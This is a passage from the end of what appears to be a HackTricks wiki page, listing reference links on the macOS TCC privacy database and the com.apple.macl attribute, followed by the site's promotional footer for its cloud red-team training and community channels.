* [**https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive)
* [**https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command**](https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command)
* [**https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/)
* [**https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/**](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
